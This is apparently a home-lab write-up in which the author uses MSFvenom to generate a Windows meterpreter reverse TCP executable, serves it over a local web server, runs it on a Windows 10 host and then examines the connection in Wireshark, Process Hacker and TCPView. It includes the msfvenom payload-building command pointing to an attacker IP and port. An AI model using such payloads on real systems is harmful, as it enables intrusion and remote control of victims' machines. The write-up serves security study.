# MSFvenom

![Pasted image 20240502094200](https://github.com/lm3nitro/Projects/assets/55665256/92706414-50e2-4614-85b6-e2b7560e74d7)

MSFvenom is a versatile tool in the Metasploit Framework used for generated various types of payloads and shellcode. It allows penetration tested and security researchers to create custom payloads for exploitation, bypassing defenses, and gaining remote access to target systems. 

Key Features:
+ Payload Generation
+ Payload Format
+ Customization

### Scope:
I will install and configure MSFvenom to create a customer reverse TCP shell payload on the attacking host (Linux OS) that will then be downloaded and executed by the victim host (Windows 10 OS). I will then analyze the traffic using various tools to see how the connection looks like and the payload execution at the packet level. 

### Tools and Technology:
Linux OS, Win 10 OS, Wireshark, Process Hacker, TCPview and MSFvenom

## Getting started with MSFvenon

Once MSFvenon is installed and running, using the -h lists the available options

```
msfvenom -h
```

![Pasted image 20240501131915](https://github.com/lm3nitro/Projects/assets/55665256/ac798fe5-2b2b-445f-903c-54aeec52edc1)

Listing the -l will show available payloads:

```
msfvenom -l payloads
```

![Pasted image 20240501132226](https://github.com/lm3nitro/Projects/assets/55665256/15af3e0c-0708-439c-ac06-af170979d19c)

Here I can see the total amount of payloads available at the time of this writing: 1475

```
msfvenom -l payloads | wc -l
```

![Pasted image 20240501132317](https://github.com/lm3nitro/Projects/assets/55665256/dab59089-4138-4765-9085-f053d88371e8)

## Custom payload for Windows:

I will be creating a custom payload for my Windows 10 host for testing and analysis. I be using the 'meterpreter_reverse_tcp'. This is a reverse tcp shell. A reverse tcp shell is used to establish a network connection from a compromised target back to the attacker's machine, which in turn facilitates remote control and command execution over the network. 

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.91.134 lport=4444 -4 exe -o lm3nitro_shell.exe
```

![Pasted image 20240501140620](https://github.com/lm3nitro/Projects/assets/55665256/061f31b8-12a7-4832-bfff-aaea596191b5)

Once that was complete, I also verified my file information:

```
file lm3nitro_shell.exe
```

![Pasted image 20240501133716](https://github.com/lm3nitro/Projects/assets/55665256/94f63484-e1c7-4360-88af-2d58b2495fac)

I then used the exploit/multi/handler which provides a listening service to interact with the payload

![Pasted image 20240501133901](https://github.com/lm3nitro/Projects/assets/55665256/a912bfbf-372b-40c0-8dff-119db6fc56d5)

I configured the exploit/multi/handler to use with the custom payload. 

![Pasted image 20240501134438](https://github.com/lm3nitro/Projects/assets/55665256/ca2462d0-a320-4df5-8de3-ea1b3791b3a2)

I now needed a web server to serve the payload. As seen below, I chose it to be locally (192.168.91.134) on port 8000:

![Pasted image 20240501135301](https://github.com/lm3nitro/Projects/assets/55665256/171f630b-c618-447b-9d94-2096cee9be09)

## Downloading the payload:

Once everything was in place, I went to the Windows host, navigated to 192.168.91.134:8000 as specified above and downloaded lm3nitro_shell.exe I had previosuly created. 

![Pasted image 20240501135710](https://github.com/lm3nitro/Projects/assets/55665256/303251b2-3d73-4aff-823a-84f7bda6f9b9)

Using the following command on the attacking host I was able to see that the Windos host had indeed connected in real time:

```
python3 -m http.server
```

![Pasted image 20240501140151](https://github.com/lm3nitro/Projects/assets/55665256/60325139-29da-4ecd-935f-1b620351cd19)

I also ensured that I had Wireshark running and capturing the traffic on the network. Here I can see the traffic from the download:

![Pasted image 20240501135931](https://github.com/lm3nitro/Projects/assets/55665256/c444cd3f-6354-4126-9a99-857617248a4c)

After having downlaoded the executable, I then executed it:

![Pasted image 20240501140042](https://github.com/lm3nitro/Projects/assets/55665256/a6a5713d-2966-45d3-a7d6-d5a0bfdc43bb)

On the attacking host ( MSFvenom) I could see that it had been executed and details on the host regarding the user, OS version/build, etc. Also, using the shell command allowed me to successfully remotely connect to the target host over the network:

![Pasted image 20240501144904](https://github.com/lm3nitro/Projects/assets/55665256/afbfd0d0-7bef-4d2a-a5ce-62afd0217761)

## Traffic analysis of the payload:

Going back to Wireshark, I can see when the payload was executed. I was able to see the 200 ok when the target host navigated to the IP and port:

![Pasted image 20240501141911](https://github.com/lm3nitro/Projects/assets/55665256/810d5f2f-9b7f-4116-8d73-a41915740313)

I also used Process Hacker. Process Hacker is a free tool for Windows that helps manage and monitor what is happening. Windows by default comes with Task Manager, however, this is a more enhanced version of that. It provides more detailed information about running programs, CPU and memory. 

Taking a look at the lm3nitro_shell.exe that is running, I was also able to see the location, command line, time that it has running, and the Parent:

![Pasted image 20240501143036](https://github.com/lm3nitro/Projects/assets/55665256/c3d3bf25-9cf7-448d-8635-a7812a97ba06)

I also used TCPView (utility within Sysinternals) which lists all active network connections, showing the local and remote addresses, ports, protocols, and status. Here I could see that the connection was establish to the attacker IP on port 4444:

![Pasted image 20240501143308](https://github.com/lm3nitro/Projects/assets/55665256/af6dba33-5efe-45a4-9c29-af57d07e5f32)


### Summary:

I was able to install and configure MSFvenom and use it to create a reverse tcp shell payload which was then downloaded by the victim (Windows 10 PC) to create a remote connection to it. While this was being downloaded and executed by the victim I had Wireshark running in the background to capture the traffic and have a look at how this malicious traffic looks at the packet level.  

Having done this allowed me to get a better understanding on attackers and a view into the malicious payloads that are readily available on tools such as MSFvenom. I was able to see how these payloads can be used to exploit vulnerable targets. I was able to further explore attack vectors and defense evasion techniques all in a safe and controlled environment. 

Overall, MSFvenom is a great tool because it really simplifies the creation of custom payloads for penetration testing and security assessments. I was able to generate malicious code tailored to my specific target. MSFvenom allows security professionals and ethical hackers to simulate real-world attacks and scenarios. One thing that I like is that it can be integrated with tools sucks as Metasploit to make it even more powerful. 


